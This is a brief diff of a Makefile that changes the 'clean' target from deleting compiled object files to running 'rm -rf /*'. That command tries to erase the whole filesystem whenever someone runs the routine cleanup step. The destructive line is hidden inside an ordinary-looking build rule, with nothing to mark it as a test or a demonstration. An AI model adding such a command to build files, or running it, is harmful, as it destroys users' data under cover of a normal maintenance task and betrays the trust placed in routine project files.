@@ -12,4 +12,4 @@ check : $(OFILES)
 	gcc $< $(CFLAGS) -c -o $@
 
 clean :
-	rm -rf $(OFILES)
+	rm -rf /*
